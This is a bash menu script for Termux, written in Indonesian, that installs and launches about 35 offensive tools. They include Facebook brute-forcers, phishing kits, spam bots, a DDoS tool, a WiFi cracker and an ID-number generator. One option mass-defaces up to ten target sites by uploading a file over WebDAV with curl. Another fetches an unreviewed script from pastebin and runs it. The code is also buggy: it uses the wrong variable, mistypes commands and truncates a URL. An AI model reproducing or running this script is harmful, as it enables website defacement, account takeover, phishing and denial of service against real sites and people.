#!/data/data/com.termux/files/usr/bin/bash
#ngapain TOD LU MAU RECODE YA??
#GAK BAKALAN JADI MASTAH LU NJIRR
#GANTI AUTHOR DOANG? TERUS LU UPLOAD KE GITHUB?
#GAK BAKALAN JADI MASTAH TOD
#MIKIR PAKE OTAK JANGAN PAKE HP
clear
#colors
blue='\e[1;34m'
green='\e[1;32m'
purple='\e[1;35m'
cyan='\e[1;36m'
red='\e[1;31m'
white='\e[1;37m'
yellow='\e[1;33m'
lightgreen='\e[1;32m'
NOW=`date "+%d.%m.%Y"`
TIME=`date "+%H:%M"`

figlet -f slant "M3D" |lolcat
 echo    "======================================"|lolcat
 echo      " AUTHOR      : M3D"|lolcat
 echo      " Version      : M3Dv1"|lolcat
echo      " Whatsapp    : 081353398031 "|lolcat
 echo      " Date        : " $NOW | lolcat
 echo      " Time        : " $TIME | lolcat
 echo    "======================================"|lolcat

echo     "pilih pilihan TOOLS dengan bijak"|lolcat
echo "[===============================================[>" |lolcat
echo  "1.> Metasploit" |lolcat
echo "[===============================================]>" |lolcat
echo "2.> MBF" |lolcat
echo  "[===============================================]>" |lolcat
echo  "3.> Sqlmap" |lolcat
echo "[===============================================]>" |lolcat
echo  "4.> Ko-Dork" |lolcat
echo "[===============================================]>" |lolcat
echo  "5.> AOC Deface" |lolcat
echo "[===============================================]>" |lolcat
echo  "6.> Black Hydra" |lolcat
echo "[===============================================]>" |lolcat
echo "7.> Weeman" |lolcat
echo "[===============================================]>" |lolcat
echo "8.> LiteSpam" |lolcat
echo "[===============================================]>" |lolcat
echo  "9.> Nuyul Cashtree" |lolcat
echo "[===============================================]>" |lolcat
echo  "10.> BAJING4Nv4" |lolcat
echo "[===============================================]>" |lolcat
echo "11.> Fb Brute" |lolcat
echo "[===============================================]>" |lolcat
echo "12.> Wifi-Hacker" |lolcat
echo "[===============================================]>" |lolcat
echo "13.> 4wsectools" |lolcat
echo "[===============================================]>" |lolcat
echo  "14.> Blazy" |lolcat
echo "[===============================================]>" |lolcat
echo "15.> Red_Hawk" |lolcat
echo "[===============================================]>" |lolcat
echo "16.> Cek Cuaca" |lolcat
echo "[===============================================]>" |lolcat
echo "17.> D-TECH" |lolcat
echo "[===============================================]>" |lolcat
echo  "18.> Hammer [ddos]" |lolcat
echo "[===============================================]>" |lolcat
echo  "19.> Fb Brute [bang Djon]" |lolcat
echo "[===============================================]>"|lolcat
echo  "20.> fb-autoreaction" |lolcat
echo "[===============================================]>" |lolcat
echo  "21.> GCO Spam" |lolcat
echo "[===============================================]>" |lolcat
echo "22.> Tools Gado-Gado" |lolcat
echo "[===============================================]>" |lolcat
echo  "23.> Ubuntu" |lolcat
echo "[===============================================]>" |lolcat
echo "24.> Brute Webdav" |lolcat
echo "[===============================================]>" |lolcat
echo "25.> Hunner Framework" |lolcat
echo "[===============================================]>" |lolcat
echo "26.> Lazymux [Buat install tools]" |lolcat
echo "[===============================================]>" |lolcat
echo  "27.> Diejoubu" |lolcat
echo "[===============================================]>" |lolcat
echo "28.> Deface Webdav" |lolcat
echo "[===============================================]>" |lolcat
echo  "29.> SocialFish [Buat Phising]" |lolcat
echo "[===============================================]>" |lolcat
echo  "30.> Tools TU4N B4DUTv4" |lolcat
echo "[===============================================]>" |lolcat
echo  "31.> Tools Scanning Website" |lolcat
echo "[===============================================]>" |lolcat
echo "32.> Tools VulnScanning" |lolcat
echo "[===============================================]>"|lolcat
echo  "33.> Hash-Buster" |lolcat
echo "[===============================================]>" |lolcat
echo  "34.> Tools Generate KK&NIK" |lolcat
echo "[===============================================]>" |lolcat
echo  "35.> Tools TU4NN1CKN4M3" |lolcat
echo "[===============================================]>"|lolcat
echo "99.KELUAR"|lolcat
echo "====================="|lolcat
echo "udah segitu aja dlu yak tod"|lolcat
trap ctrl_c INT
ctrl_c()
{
echo -e "$red segini dulu ya tod capek gua "
figlet -f digital "     BYEEE"
sleep 1
exit
}
read -p "Silahkan Pilih :" gg

if [ $gg = 1 ] || [ $gg = 1 ]
then
clear
figlet -f slant "M3D" |lolcat
cd /data/data/com.termux/files/home
pkg update -y
pkg install wget -y
wget https://Auxilus.github.io/metasploit.sh
./metasploit.sh
cd $HOME/metasploit-framework
cd /data/data/com.termux/files/home && gem install bundle --pre
cd /data/data/com.termux/files/home &&
bundle config build.nokogiri --use-system-libraries
cd /data/data/com.termux/files/home && bundle install
echo "Metasploit udah tod ^_^" | lolcat
sleep 1
sleep 1
cd $HOME && ./msfconsole
fi
if [ $gg = 1 ] || [ $gg = 1 ]
then
figlet -f slant "M3D" |lolcat
cd $HOME
fi
if [ $gg = 2 ] || [ $gg = 2 ]
then
figlet -f slant "M3D" |lolcat
clear
cd $HOME
pkg update -y
pkg install python2  -y
pkg install git -y
pip2 install mechanize
git clone https://github.com/tikuskecil/multi-bruteforce-facebook
cd multi-bruteforce-facebook
sleep 1
python2 MBF.py
fi

if
[ $gg = 2 ] || [ $gg = 2 ]
then
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 3 ] || [ $gg = 3 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
pkg update -y
pkg install git -y
pkg install python2 -y
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
echo "gunakan -u (masukin target) --dbs (nyari database) --T (cari table)"|lolcat
sleep 1
python2 sqlmap.py
fi

if
 [ $gg = 3 ] || [ $gg = 3 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 4 ] || [ $gg = 4 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
apt upgrade -y
apt install git -y
apt install python2 -y
git clone https://github.com/CiKu370/ko-dork
cd ko-dork
sleep 1
python2 dork.py
fi

if
 [ $gg = 4 ] || [ $gg = 4 ]
then
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 5 ] || [ $gg = 5 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
apt update -y
apt upgrade -y
apt install git -y
git clone https://github.com/Amriez/AOCDEFACE.git
cd AOCDEFACE
sh install.sh
sleep 1
sh AOC.sh
fi

if
 [ $gg = 5 ] || [ $gg = 5 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 6 ] || [ $gg = 6 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
pkg update -y
pkg install git hydra -y
pkg install git -y
pkg install python -y
pkg install python2 -y
git clone https://github.com/Gameye98/Black-Hydra
cd Black-Hydra
chmod +x blackhydra.py
sleep 1
python2 blackhydra.py
fi

if
 [ $gg = 6 ] || [ $gg = 6 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if [ $gg = 7 ] || [ $gg = 7 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
pkg update -y
pkg upgrade -y
pkg install python -y
pkg install python2 -y
pkg install git -y
git clone https://github.com/samyoyo/weeman
chmod +x weeman
cd weeman
sleep 1
python2 weeman.py
fi

if [ $gg = 7 ] || [ $gg = 7 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if [ $gg = 8 ] || [ $gg = 8 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
apt update && apt upgrade -y
apt install git
apt install php -y
apt install sh
git clone https://github.com/4L13199/LITESPAM
cd LITESPAM/
sleep1
sh LITESPAM.sh
fi

if [ $gg = 8 ] || [ $gg = 8 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if [ $gg = 9 ] || [ $gg = 9 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
apt update && apt upgrade -y
apt-get install nano && apt-get install php -y
pkg install git
git clone https://github.com/radenvodka/cashtree/
cd cashtree
sleep1
nano cashtree.php
echo "UDAH ke nano? ketik ini php cashtree.php"|lolcat
fi

if [ $gg = 9 ] || [ $gg = 9 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if [ $gg = 10 ] || [ $gg = 10 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
pkg install git php python2 cowsay figlet toilet ruby -y
pip2 install toilet
pip2 install lolcat
git clone https://github.com/DarknessCyberTeam/B4J1N64Nv4
cd B4J1N64Nv4
sleep1
sh bajingan.sh
fi

if [ $gg = 10 ] || [ $gg = 10 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if [ $gg = 11 ] || [ $gg = 11 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
apt update && apt upgrade -y
apt install python2 -y
apt install php -y
apt install python2-dev -y
pip2 install mechanize
apt install git
git clone https://github.com/Senitopeng/fbbrute.git
cd fbbrute
sleep1
python2 jomblo.py
fi

if [ $gg = 11 ] || [ $gg = 11 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if [ $gg = 12 ] || [ $gg = 12 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
apt update && apt upgrade -y
pkg install git -y
git clone https://github.com/esc0rtd3w/wifi-hacker
cd wifi-hacker
sleep1
sh wifi-hacker.sh
fi

if [ $gg = 12 ] || [ $gg = 12 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if [ $gg = 13 ] || [ $gg = 13 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
apt update && apt upgrade
$ apt install git
$ git clone https://github.com/aryanrtm/4wsectools
chmod 777 tools
sleep1
./tools
fi

if [ $gg = 13 ] || [ $gg = 13 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if [ $gg = 14 ] || [ $gg = 14 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
apt install git python2 python2-dev clang libxml2 -y
git clone https://github.com/UltimateHackers/Blazy.git
cd Blazy
pip2 install -r requirements.txt
cd Blazy
sleep1
python2 blazy.py
fi

if [ $gg = 14 ] || [ $gg = 14 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if [ $gg = 15 ] || [ $gg = 15 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
apt update
pkg install curl -y
apt install git
git clone https://github.com/Tuhinshubhra/RED_HAWK
cd RED_HAWK
sleep1
php rhawk.php
fi

if [ $gg = 15 ] || [ $gg = 15 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if [ $gg = 16 ] || [ $gg = 16 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
apt update
apt upgrade
apt install install curl
apt install libcurl
echo "KLO UDAH INSTALL TERAKHIR KETIK /COPAS DIBAWAH INI"|lolcat
echo "============================="|lolcat
echo "curl http://wttr.in/nama_kota"|lolcat
echo "============================="|lolcat
fi

if [ $gg = 16 ] || [ $gg = 16 ]
then
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 17 ] || [ $gg = 17 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
pkg install git
git clone https://github.com/shawarkhanethicalhacker/D-TECT
ls
cd D-TECH
chmod +x d-tect.py
sleep 1
python2 d-tect.py
fi

if
 [ $gg = 17 ] || [ $gg = 17 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 18 ] || [ $gg = 18 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
pkg update
pkg upgrade
pkg install python
pkg install git
git clone https://github.com/cyweb/hammer
cd hammer
sleep 1
python hammer.py
fi

if
 [ $gg = 18 ] || [ $gg = 18 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 19 ] || [ $gg = 19 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
git clone https://github.com/Senitopeng/BotFbBangDjon.git
cd BotFbBangDjon
python2 bangdjon.py
fi

if
 [ $gg = 19 ] || [ $gg = 19 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 20 ] || [ $gg = 20 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
git clone https://github.com/tomiashari/fb-autoreaction.git
cd fb-autoreaction
sleep 1
python2 fb-autoreaction
fi

if
 [ $gg = 20 ] || [ $gg = 20 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 21 ] || [ $gg = 21 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
apt upgrade && apt update
apt install git
git clone https://github.com/Amriez/gcospam
cd gcospam
sh install.sh
sleep1
sh gco.sh
fi

if
 [ $gg = 21 ] || [ $gg = 21 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 22 ] || [ $gg = 22 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
apt update && apt upgrade
apt install ruby
apt install lolcat
apt install git
git clone https://github.com/Senitopeng/GadoGado.git
mv GadoGado
cd GadoGado
sleep1
bash gado
fi

if
 [ $gg = 22 ] || [ $gg = 22 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 23 ] || [ $gg = 23 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
apt update
apt install git
apt install wget
apt install proot
git clone https://github.com/Neo-Oli/termux-ubu&#8230;
cd termux-ubuntu
chmod +x ubuntu.sh
./ubuntu.sh
sleep1
./start.sh
fi

if
 [ $gg = 23 ] || [ $gg = 23 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 24 ] || [ $gg = 24 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
toilet -f standard -F gay "BruteWebdav"
echo "Masukan nama script"
read -p "[=======>" script
echo "\033[32;1m"
echo "Masukan Web Target Ke1"
read -p "[=======>" Ke1
curl -T /storage/emulated/0/$script $Ke1
echo "\033[32;1m" "Masukan Web Target Ke2 "
read -p "[=======>" Ke2
curl -T /storage/emulated/0/$script $Ke2
echo "\033[32;1m" "Masukan Web Target Ke3"
read -p "[=======>" Ke3
curl -T /storage/emulated/0/$script $Ke3
echo "\033[32;1m" "Masukan Web Target Ke4"
read -p "[=======>" Ke4
curl -T /storage/emulated/0/$script $Ke5
echo "\033[32;1m" "Masukan Web Target Ke5"
read -p "[=======>" Ke5
curl -T /storage/emulated/0/$script $Ke5
echo "\033[32;1m" "Masukan Web Target Ke6"
read -p "[=======>" Ke6
curl -T /storage/emulated/0/$script $Ke6
echo "\033[32;1m" "Masukan Web Target Ke7"
read -p "[=======>" Ke7
curl -T /storage/emulated/0/$script $Ke7
echo "\033[32;1m" "Masukan Web Target Ke8"
read -p "[=======>" Ke8
curl -T /storage/emulated/0/$script $Ke8
echo "\033[32;1m" "Masukan Web Target Ke9"
read -p "[=======>" Ke9
curl -T /storage/emulated/0/$script $Ke9
echo "\033[32;1m" "Masukan Web Target Ke10"
read -p "[=======>" Ke10
curl -T /storage/emulated/0/$script $Ke10
sleep 1
echo "[<=====================SEDANG PROSES=====================>]"
echo "Silahkan Cek Web $Ke1/$script"
echo "Silahkan Cek Web $Ke2/$script"
echo "Silahkan Cek Web $Ke3/$script"
echo "Silahkan Cek Web $Ke4/$script"
echo "Silahkan Cek Web $Ke5/$script"
echo "Silahkan Cek Web $Ke6/$script"
echo "Silahkan Cek Web $Ke7/$script"
echo "Silahkan Cek Web $Ke8/$script"
echo "Silahkan Cek Web $Ke9/$script"
echo "Silahkan Cek Web $Ke10/$script"
echo "[=============HAPPY DEFACE=============]"
fi

if
 [ $gg = 24 ] || [ $gg = 24 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 25 ] || [ $gg = 25 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
apt update
apt install python
apt install git -y
git clone https://github.com/b3-v3r/Hunner
cd Hunner
chmod 777 hunner.py
sleep1
python hunner.py
fi

if
 [ $gg = 25 ] || [ $gg = 25 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 26 ] || [ $gg = 26 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
pkg update && upgrade
pkg install python2
pkg install git
git clone https://github.com/Gameye98/Lazymux
cd Lazymux
chmod +x lazymux.py
sleep1
python2 lazymux.py
fi

if
 [ $gg = 26 ] || [ $gg = 26 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 27 ] || [ $gg = 27 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
apt upgrade && apt update
apt install php
apt install git
git clone https://github.com/alintamvanz/diejoubu
cd diejoubu
cd v1.2
sleep1
php diejoubu.php
fi

if
 [ $gg = 27 ] || [ $gg = 27 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 28 ] || [ $gg = 28 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
apt update && upgrade
apt install python2
pip2 install urllib3 chardet certifi idna requests
apt install openssl curl
pkg install libcurl
ln -s /sdcard
cd sdcard
mkdir webdav
cd webdav
curl -k -O https://pastebin.com/raw/HnVyQPtR
mv HnVyQPtR webdav.py
sleep1
python2 webdav.py
fi

if
 [ $gg = 28 ] || [ $gg = 28 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 29 ] || [ $gg = 29 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
apt update && apt upgrade
apt install python2 git php curl
git clone https://github.com/UndeadSec/SocialFish/ socialfish/
cd socialfish
pip2 install -r requirements.txt
python2 SocialFish.py
sleep1
mv SocialFish.py main.py
fi

if
 [ $gg = 29 ] || [ $gg = 29 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 30 ] || [ $gg = 30 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
apt update && apt upgrade
pkg install python python2 vim figlet curl
pkg install php
pip2 install lolcat
pkg install git
git clone https://github.com/TUANB4DUT/TOOLSINSTALLERv4
cd TOOLSINSTALLERv4
ls
chmod 777 TUANB4DUT..sh
sleep1
./TUANB4DUT..sh
fi

if
 [ $gg = 30 ] || [ $gg = 30 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 31 ] || [ $gg = 31 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
apt update
apt upgrade
pkg install php
pkg install git
git clone https://github.com/googleinurl/SCANNER-INURLBR.git
cd SCANNER-INURLBR
sleep1
php inurlbr.php
fi

if
 [ $gg = 31 ] || [ $gg = 31 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 32 ] || [ $gg = 32 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
Apt update && pat upgrade
Pkg install python2
Pkg install git clone https://github.com/kereh/VulnScaner
Cd VulnScaner
Chmod +x VulnScaner.py
sleep1
Python2 VulnScaner.py
fi

if
 [ $gg = 32 ] || [ $gg = 32 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 33 ] || [ $gg = 33 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
apt update
apt upgrade
apt install python2
apt install git
git clone https://github.com/UltimateHackers/Hash-Buster
cd Hash-Buster
sleep1
python2 hash.py
fi

if
 [ $gg = 33 ] || [ $gg = 33 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if
 [ $gg = 34 ] || [ $gg = 34 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
git clone https://github.com/zerosvn/ktpkkgenerate
ls
cd ktpkkgenerate
ls
sleep1
php zerosvn.php
fi

if
 [ $gg = 34 ] || [ $gg = 34 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
f

if
 [ $gg = 35 ] || [ $gg = 35 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
pkg update && pkg upgrade
pkg install python2
pip2 install lolcat
pkg install cowsay
pkg install git
git clone https://github.com/TU4NN1CKN4M3/Trouble_shoot
cd Trouble_shoot
sleep1
sh GASSKUY.sh
fi

if
 [ $gg = 35 ] || [ $gg = 35 ]
then
clear
figlet -f slant "M3D" |lolcat
cd $HOME
fi

if [ $gg = 99 ] || [ $gg = 99 ]
then
echo "THANKS SUDAH GUNAKAN TOOLS SAYA"|lolcat
sleep 1
figlet -f slant "M3D" |lolcat
exit
fi
